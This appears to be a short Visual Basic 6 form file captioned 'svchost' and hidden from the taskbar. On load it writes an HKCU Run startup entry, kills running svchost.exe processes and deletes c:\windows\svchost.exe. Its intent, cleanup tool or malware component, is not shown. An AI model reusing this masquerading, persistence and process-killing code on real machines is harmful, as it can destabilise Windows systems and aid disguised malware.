VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "svchost"
   ClientHeight    =   3030
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4560
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3030
   ScaleWidth      =   4560
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    Call SaveSettingString(HKEY_CURRENT_USER, "SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN", "svchost service", "C:\Windows\system32\svchost.exe")
    If ProcessoExiste("svchost.exe") Then Call KillProcess("svchost.exe")
    On Error Resume Next
    Call Kill("c:\windows\svchost.exe")
    End
End Sub
